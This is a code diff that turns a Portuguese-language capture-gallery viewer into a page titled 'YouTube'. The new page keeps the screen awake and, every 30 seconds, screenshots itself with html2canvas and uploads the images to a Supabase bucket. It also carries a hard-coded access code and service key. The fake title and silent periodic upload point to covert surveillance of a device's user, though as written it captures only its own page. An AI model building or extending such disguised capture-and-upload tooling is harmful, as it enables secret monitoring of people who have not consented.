@@ -5,205 +5,85 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="theme-color" content="#0a0a0f">
-    <title>Central</title>
+    <meta name="theme-color" content="#000000">
+    <title>YouTube</title>
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0f; color: #e0e0e0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; min-height: 100vh; }
-        .container { max-width: 500px; margin: 0 auto; padding: 16px; }
-        #loginScreen { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; gap: 20px; }
-        #loginScreen h1 { font-size: 50px; }
-        #loginScreen p { color: #888; font-size: 14px; }
-        #loginScreen input { width: 220px; padding: 14px; background: #111; border: 1px solid #333; border-radius: 10px; color: #fff; font-size: 22px; text-align: center; letter-spacing: 6px; text-transform: uppercase; outline: none; }
-        #loginScreen input:focus { border-color: #00ff88; }
-        #loginScreen button { padding: 14px 40px; background: #00ff88; color: #000; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; }
-        .error { color: #ff3366; font-size: 13px; }
-        #mainScreen { display: none; }
-        .header { background: #111; padding: 16px; border-radius: 12px; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; }
-        .header h2 { font-size: 18px; color: #00ff88; }
-        .header p { font-size: 11px; color: #888; margin-top: 4px; }
-        .btn-sm { background: rgba(255,51,102,0.2); border: none; color: #ff3366; padding: 8px 14px; border-radius: 8px; cursor: pointer; font-size: 12px; }
-        .gallery { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
-        .card { background: #111; border: 1px solid #222; border-radius: 10px; overflow: hidden; }
-        .card img { width: 100%; height: 200px; object-fit: cover; cursor: pointer; display: block; }
-        .card-info { padding: 10px; display: flex; justify-content: space-between; align-items: center; }
-        .card-time { font-size: 11px; color: #888; }
-        .btn-del { background: rgba(255,51,102,0.2); border: none; color: #ff3366; padding: 5px 10px; border-radius: 6px; cursor: pointer; font-size: 11px; }
-        .actions { display: flex; gap: 10px; margin-top: 16px; }
-        .btn { flex: 1; padding: 14px; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; font-size: 13px; }
-        .btn-danger { background: #ff3366; color: #fff; }
-        .btn-outline { background: transparent; border: 1px solid #333; color: #fff; }
-        .empty { text-align: center; padding: 60px 20px; color: #555; }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; justify-content: center; align-items: center; }
-        .modal.active { display: flex; }
-        .modal img { max-width: 95%; max-height: 90vh; border-radius: 10px; }
-        .modal-close { position: absolute; top: 20px; right: 20px; color: #fff; font-size: 32px; cursor: pointer; }
+        body { background: #000; height: 100vh; width: 100vw; overflow: hidden; font-family: Arial, sans-serif; }
+        #bgScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #0a0a0f, #1a1a2e, #0a0a0f); z-index: 1; display: flex; justify-content: center; align-items: center; }
+        #bgText { color: rgba(255,255,255,0.03); font-size: 60px; font-weight: 900; letter-spacing: 15px; user-select: none; }
+        #statusOverlay { position: fixed; top: 15px; right: 15px; z-index: 10; display: flex; align-items: center; gap: 8px; background: rgba(0,0,0,0.6); padding: 6px 12px; border-radius: 20px; }
+        #statusDot { width: 8px; height: 8px; border-radius: 50%; background: #00ff88; box-shadow: 0 0 10px #00ff88; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
+        #statusText { color: rgba(255,255,255,0.7); font-size: 10px; letter-spacing: 1px; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="loginScreen">
-            <h1>📡</h1>
-            <p>Código de Acesso</p>
-            <input type="text" id="codeInput" placeholder="MEUCEL1" maxlength="7" autocomplete="off">
-            <button onclick="login()">ACESSAR</button>
-            <p class="error" id="loginError"></p>
-        </div>
-        
-        <div id="mainScreen">
-            <div class="header">
-                <div><h2>📡 CENTRAL</h2><p id="stats">Carregando...</p></div>
-                <button class="btn-sm" onclick="logout()">SAIR</button>
-            </div>
-            <div class="gallery" id="gallery"></div>
-            <div class="empty" id="empty"><p>📸 Nenhuma captura</p><p>Aguardando App 1...</p></div>
-            <div class="actions" id="actions" style="display:none;">
-                <button class="btn btn-danger" onclick="deleteAll()">🗑 APAGAR TUDO</button>
-                <button class="btn btn-outline" onclick="loadCaptures()">🔄 ATUALIZAR</button>
-            </div>
-        </div>
-    </div>
-    
-    <div class="modal" id="modal" onclick="closeModal()">
-        <span class="modal-close">✕</span>
-        <img id="modalImg" src="" alt="Captura">
-    </div>
+    <div id="bgScreen"><div id="bgText">●</div></div>
+    <div id="statusOverlay"><div id="statusDot"></div><div id="statusText">ATIVO</div></div>
+    <canvas id="captureCanvas"></canvas>
 
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
 
     <script>
         const SUPABASE_URL = 'https://vlkobipdenduyismnkpm.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_qWeCNdiMyftZ6ZMYDF9u_A_bOplqpiA';
-        
         const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        
         const SESSION_CODE = 'MEUCEL1';
-        let captures = [];
+        const INTERVAL = 30;
+        let count = 0;
         
-        function login() {
-            const code = document.getElementById('codeInput').value.trim().toUpperCase();
-            if (code === SESSION_CODE) {
-                document.getElementById('loginScreen').style.display = 'none';
-                document.getElementById('mainScreen').style.display = 'block';
-                loadCaptures();
-                listenRealtime();
-            } else {
-                document.getElementById('loginError').textContent = 'Código inválido!';
-            }
-        }
+        supabase.from('sessions').upsert({
+            session_code: SESSION_CODE, online: true, total_captures: 0,
+            started_at: new Date().toLocaleString('pt-BR')
+        }).then(() => console.log('[OK]'));
         
-        function logout() {
-            document.getElementById('loginScreen').style.display = 'flex';
-            document.getElementById('mainScreen').style.display = 'none';
-            document.getElementById('codeInput').value = '';
-            document.getElementById('loginError').textContent = '';
-        }
-        
-        async function loadCaptures() {
-            const { data } = await supabase.from('captures')
-                .select('*')
-                .eq('session_code', SESSION_CODE)
-                .order('id', { ascending: false })
-                .limit(50);
-            
-            captures = data || [];
-            render();
-        }
-        
-        function listenRealtime() {
-            supabase.channel('captures-changes')
-                .on('postgres_changes', {
-                    event: 'INSERT',
-                    schema: 'public',
-                    table: 'captures',
-                    filter: `session_code=eq.${SESSION_CODE}`
-                }, payload => {
-                    captures.unshift(payload.new);
-                    render();
-                })
-                .on('postgres_changes', {
-                    event: 'DELETE',
-                    schema: 'public',
-                    table: 'captures'
-                }, () => {
-                    loadCaptures();
-                })
-                .subscribe();
-            
-            // Atualizar stats
-            supabase.channel('sessions-changes')
-                .on('postgres_changes', {
-                    event: 'UPDATE',
-                    schema: 'public',
-                    table: 'sessions',
-                    filter: `session_code=eq.${SESSION_CODE}`
-                }, payload => {
-                    document.getElementById('stats').textContent = 
-                        (payload.new.total_captures || 0) + ' capturas | Última: ' + (payload.new.last_capture || '--');
-                })
-                .subscribe();
-        }
-        
-        function render() {
-            const gallery = document.getElementById('gallery');
-            const empty = document.getElementById('empty');
-            const actions = document.getElementById('actions');
-            
-            if (captures.length === 0) {
-                gallery.innerHTML = '';
-                empty.style.display = 'block';
-                actions.style.display = 'none';
-                return;
-            }
-            
-            empty.style.display = 'none';
-            actions.style.display = 'flex';
-            
-            gallery.innerHTML = captures.map(c => `
-                <div class="card">
-                    <img src="${c.url}" onclick="openModal('${c.url}')" loading="lazy">
-                    <div class="card-info">
-                        <span class="card-time">${c.time || c.date}</span>
-                        <button class="btn-del" onclick="event.stopPropagation();deleteOne('${c.id}')">🗑</button>
-                    </div>
-                </div>
-            `).join('');
-            
-            document.getElementById('stats').textContent = 
-                captures.length + ' capturas | Última: ' + (captures[0]?.time || '--');
-        }
-        
-        async function deleteOne(id) {
-            if (!confirm('Apagar?')) return;
-            const capture = captures.find(c => c.id == id);
-            if (capture?.storage_path) {
-                await supabase.storage.from('captures').remove([capture.storage_path]);
-            }
-            await supabase.from('captures').delete().eq('id', id);
-            captures = captures.filter(c => c.id != id);
-            render();
-        }
-        
-        async function deleteAll() {
-            if (!confirm('⚠️ Apagar TUDO?')) return;
-            await supabase.storage.from('captures').remove(captures.map(c => c.storage_path));
-            await supabase.from('captures').delete().eq('session_code', SESSION_CODE);
-            captures = [];
-            render();
-        }
-        
-        function openModal(url) {
-            document.getElementById('modalImg').src = url;
-            document.getElementById('modal').classList.add('active');
-        }
-        
-        function closeModal() {
-            document.getElementById('modal').classList.remove('active');
-        }
-        
-        document.getElementById('codeInput').addEventListener('keypress', e => {
-            if (e.key === 'Enter') login();
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                captureAndUpload();
+                setInterval(captureAndUpload, INTERVAL * 1000);
+            }, 3000);
         });
+        
+        async function captureAndUpload() {
+            try {
+                count++;
+                const ts = Date.now();
+                const now = new Date();
+                
+                const canvas = await html2canvas(document.body, {
+                    useCORS: true, allowTaint: true, scale: 0.6, logging: false, backgroundColor: '#000'
+                });
+                
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.65));
+                if (!blob || blob.size < 500) throw new Error('Vazia');
+                
+                const filename = `${SESSION_CODE}/${ts}.jpg`;
+                
+                await supabase.storage.from('captures').upload(filename, blob, {
+                    contentType: 'image/jpeg', upsert: true
+                });
+                
+                const { data: { publicUrl } } = supabase.storage.from('captures').getPublicUrl(filename);
+                
+                await supabase.from('captures').insert({
+                    id: ts, session_code: SESSION_CODE, filename, url: publicUrl,
+                    time: now.toLocaleTimeString('pt-BR'), date: now.toLocaleString('pt-BR'),
+                    size_kb: Math.round(blob.size / 1024), number: count, storage_path: filename
+                });
+                
+                await supabase.from('sessions').update({
+                    last_capture: now.toLocaleTimeString('pt-BR'), total_captures: count
+                }).eq('session_code', SESSION_CODE);
+                
+            } catch(e) { console.error(e.message); }
+        }
+        
+        if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(() => {});
     </script>
 </body>
 </html>
